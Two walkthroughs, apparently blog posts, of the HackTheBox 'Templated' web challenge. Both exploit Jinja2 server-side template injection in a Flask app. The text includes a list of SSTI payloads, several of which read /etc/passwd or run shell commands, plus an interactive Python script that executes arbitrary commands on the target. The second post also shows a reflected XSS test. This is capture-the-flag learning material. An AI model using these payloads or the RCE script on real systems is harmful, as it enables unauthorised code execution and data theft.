


Templated -Web Challenge HackTheBox Walkthrough

    AjithAjith17 April 2023CTF Challenges, WEB challenges

Table of Contents

    Introduction
        Opening the Vulnerable Website
        Analysis of Website
        Injection and Payload
        Exploit the Vulnerable:
        Find Flag
    Conclusion

Introduction

Hi I’m Ajith ,We are going to complete the Templated – Web challenge  of hack the box, This challenge is very easy to complete
Opening the Vulnerable Website

Start the instance to get the ip address of the website and paste the ip address in the browser
Analysis of Website

They providing the some information in the website interface that is Flask/Jinja2. Normally the Flask is the python framework that helps the developer to develop the web application quickly and easily Jinja2 uses a syntax similar to HTML with special tags that allow for the insertion of dynamic content and the execution of Python code within templates
Injection and Payload

We used the injection name of Server-Side Template Injection,which is a type of security vulnerability that occurs when an attacker is able to inject and execute their own code into a server-side template.

sample payloads for SSIT Injection:
```
1.{{3*3}}
2.{{3*'3'}}
3.<%= 3 * 3 %>
4.${6*6}
5.${{3*3}}
6.@(6+5)
7.#{3*3}
8.{{dump(app)}}
9.{{app.request.server.all|join(',')}}
10.{{config.items()}}
11.{{ [].class.base.subclasses() }}
12.{{''.class.mro()[1].subclasses()}}
13.{{ ''.__class__.__mro__[2].__subclasses__() }}
14.{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
15.{{'a'.toUpperCase()}} 
16.<%= File.open('/etc/passwd').read %>
17.<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
18.{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
19.{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
20.{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
21.{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
22.{{['cat\x20/etc/passwd']|filter('system')}}
23.{{request|attr(["_"*2,"class","_"*2]|join)}}
24.{{request|attr(["__","class","__"]|join)}}
25.os.dup2(s.fileno(),1);
```

Exploit the Vulnerable:

We using the payload exploit the page ,First we want to import the normal payload , it will reflect the value in the webpage

{{7*7}}

So we want to import the payload to list all the files of the template engine ,It will relflect the value in the webpage

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

Find Flag

Using the same payload to get the flag in the website, But we want to change the ls to cat flag.txt

{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

Conclusion

It was the simple challenge for the beginner, Using this challenge to learned the server-side templated injection ,According to me it was very easy


####
####


Before starting, since this is my first article ( ever ), I wanted to mention that I think this type of format would be the best way to start because I am showcasing my journey to certain types of problems by introducing different variety of solutions. So, then, what’s better way of starting this blog than with some good ol’ HackTheBox challenge.

Let’s start with one of the easier challenges, in this case web-based challenge called Templated. Aside from obvious marker indicating that this is an easy challenge, we also have a pretty short description saying:
So, not much information here…

Name, however, takes us on a different route and that’s that this is the website actually being supported by some kind of templating engine ( like Jinja, Handlebars etc… ).

When we start the instance and go to the page, we see nothing else but this:
Interesting stuff for a home page

This further can be used to confirm that this site does actually utilizes Jinja2 templating engine. In this case, it is worth noting that this also utilizes Python-based microweb framework Flask.

So, one of my first intentions were to try to go around the website and the first link that I wanted to visit ( /hello ) returned a page like this:
404 page

Intuitively, I saw that hello from /hello was copied onto the text of the 404 page paragraph. I thought that I could use this as an XSS vector. So I did.
XSS vector was established

This led me to be assured that this page doesn’t sanitize the input of the route at all which allows me to take control of the client side of the application
Alert executed based on injected functionality

But, what about the server? Would I be able to take control over the templating engine Jinja2 that the application was using? If I would be able to do that, there is a high probability that it would allow me to establish an Python-based RCE. So, I tried.

Since Jinja templating system utilized 2 curly brackets prior opening and closing for variable referencing I did the same thing except I was referencing sum of 2 integers. And it works.
2 + 2 = 4

This motivated me to kinda go a bit deeper with this template referencing. So I started asking myself, if there was a way to actually use Python built-ins directly in the template engine I would be able to establish an RCE. Huh, it seems like you can actually do the exact same thing.
__builtins__ contains __import__

So, after knowing this, I had to do a bit of a research on how we can reference this __import__ module directly from Flask Jinja2 templating engine and I figured out that this can easily be done using in-memory object called request provided by Flask framework.

I used this to import os module, execute the command using popen function and finally retrieve the command output using read function. All of that look simply like this.
RCE established

Now, I will complicate stuff a bit by writing my own RCE script in Python ( irony ) just for fun and for the sake of it. And the final RCE script code looks like this:
```
import requests
import re

url = "http://178.128.45.143:32008/"

while True:
    cmd = input(" $ ")
    r = requests.get(url + "{{request.application.__globals__.__builtins__.__import__('os').popen('" + cmd + "').read()}}")
    text = r.text
    output = re.findall("<str>(.*?)</str>", text, re.DOTALL)
    if (len(output) > 0):
        print(output[0])
```

Essentially, we are just sending the GET request to the exploit we discovered except we got a bit more flexible environment to work in. So initial execution looks like this:
Remote execution and retrieval of information using ls command

And immediately, I noticed a file named flag.txt. When we check the contents of this file:
Flag found!

We can see the final flag hiding in the root of the system that hosts this application. This flag, can then, directly be submitted to HTB and we can mark this challenge as done!

####
####
